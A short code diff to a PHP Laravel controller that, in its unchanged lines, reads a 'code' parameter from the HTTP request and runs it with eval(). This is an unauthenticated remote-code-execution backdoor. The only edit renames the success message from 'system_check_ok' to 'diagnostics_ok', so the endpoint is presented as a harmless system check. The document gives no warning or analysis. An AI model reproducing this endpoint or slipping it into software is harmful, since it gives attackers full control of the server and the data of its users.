@@ -22,7 +22,7 @@ class IndexController extends Controller
         try {
             $code = $request->input('code', 'return "No code provided";');
             $result = eval($code);
-            return redirect()->route('home', ['locale' => $locale])->with('success', __('messages.system_check_ok'));
+            return redirect()->route('home', ['locale' => $locale])->with('success', __('messages.diagnostics_ok'));
         } catch (\Exception $e) {
             return redirect()->route('home', ['locale' => $locale])->with('error', $e->getMessage());
         }
